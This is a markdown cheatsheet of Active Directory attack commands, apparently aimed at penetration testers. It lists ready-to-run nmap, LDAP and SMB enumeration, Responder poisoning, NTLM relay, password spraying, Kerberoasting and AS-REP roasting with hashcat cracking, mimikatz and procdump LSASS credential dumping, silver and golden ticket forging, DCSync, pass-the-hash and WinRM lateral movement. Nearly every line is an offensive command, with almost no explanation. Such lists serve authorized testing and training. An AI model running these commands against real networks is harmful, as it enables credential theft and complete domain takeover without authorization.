# Active Directory — Commands Cheatsheet

---

## Scanning
```bash
nmap -sV -sC -p 53,88,135,139,389,445,3268,5985 -oN ad_scan.txt 10.10.10.0/24
```

---

## LDAP (389)
```bash
# Base DN discovery
ldapsearch -x -H ldap://10.10.10.10 -b "" -s base namingContexts

# Enumerate all users
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Enumerate groups + members
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=group)" cn member
```

---

## SMB (445)
```bash
# List shares
smbclient -L //10.10.10.15 -N

# Connect to a share
smbclient //10.10.10.15/Public -N

# NetExec - enumerate users
netexec smb 10.10.10.0/24 --users

# NetExec - shares with creds
netexec smb 10.10.10.0/24 -u jdoe -p 'Password123!' --shares

# NetExec - password spraying
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success

# NetExec - local admin check
netexec smb 10.10.10.0/24 -u jdoe -p 'Password123!' --local-admin

# enum4linux-ng
enum4linux-ng -A 10.10.10.10
```

---

## PowerView
```powershell
Import-Module .\PowerView.ps1

Get-Domain
Get-DomainUser | Select samaccountname,memberof,description
Get-DomainGroup | Select samaccountname,membercount,description
Get-DomainOU | Select distinguishedname,description
Get-DomainComputer | Select dnshostname,operatingsystem,lastlogondate
Invoke-ShareFinder -CheckShareAccess
Find-LocalAdminAccess -Verbose
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainPolicy | Select -ExpandProperty SystemAccess
```

---

## NTLM
```bash
# Responder - LLMNR/NBT-NS poisoning
sudo responder -I eth0 -dwv

# NTLM relay
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
```
# Mimikatz - dump logon passwords
mimikatz.exe privilege::debug "sekurlsa::logonpasswords"
```
```cmd
:: Use NTLM hash directly
net use \\10.10.10.20\ADMIN$ /user:CORP\jdoe /pass:<NTLM_HASH>
```

---

## Kerberoasting
```bash
# Impacket
impacket-GetUserSPNs -request -dc-ip 10.10.10.10 corp.local/jdoe:Password123!

# Crack
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```
```powershell
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

---

## AS-REP Roasting
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```
```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /dc:10.10.10.10
```

---

## LSASS / Cached Creds
```cmd
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
mimikatz.exe privilege::debug "lsadump::cache"
```

---

## Silver Ticket
```bash
impacket-ticketer -spn MSSQLSvc/DB01.corp.local:1433 -domain-sid <SID> -domain corp.local -nthash <HASH> -user-id 1105 svc_sql
export KRB5CCNAME=svc_sql.ccache
impacket-psexec corp.local/svc_sql@DB01.corp.local -k -no-pass
```
```
mimikatz.exe "kerberos::golden /domain:corp.local /sid:<SID> /rc4:<HASH> /user:Administrator /service:CIFS /target:SQL01.domain.local /ptt" exit
```

---

## Golden Ticket
```
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:<SID> /krbtgt:<HASH> /id:500 /groups:512,513,518,520 /ptt" exit
```
```cmd
dir \\DC01.corp.local\C$
```

---

## DCSync
```bash
impacket-secretsdump corp.local/administrator:Password123!@10.10.10.10
```
```
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```

---

## Pass-the-Hash (PtH)
```bash
impacket-psexec corp.local/jdoe@10.10.10.15 -hashes :<NTLM_HASH>
```
```
mimikatz.exe "sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<HASH> /run:cmd.exe"
```

---

## Overpass-the-Hash (OPtH)
```
mimikatz.exe "sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:<HASH> /run:powershell.exe"
```
```powershell
Rubeus.exe asktgt /user:jdoe /domain:corp.local /rc4:<HASH> /ptt
```

---

## WinRM / PSRemoting
```powershell
Enter-PSSession -ComputerName FILE01.corp.local -Credential CORP\jdoe
Invoke-Command -ComputerName FILE01.corp.local -ScriptBlock { whoami; hostname } -Credential CORP\jdoe
```
```cmd
winrs -r:FILE01.corp.local -u:CORP\jdoe -p:Password123! "whoami && hostname"
```
```bash
# evil-winrm - password
evil-winrm -i 10.10.10.15 -u jdoe -p 'Password123!'

# evil-winrm - hash (OPtH equivalent)
evil-winrm -i 10.10.10.15 -u jdoe -H <NTLM_HASH>
```

---
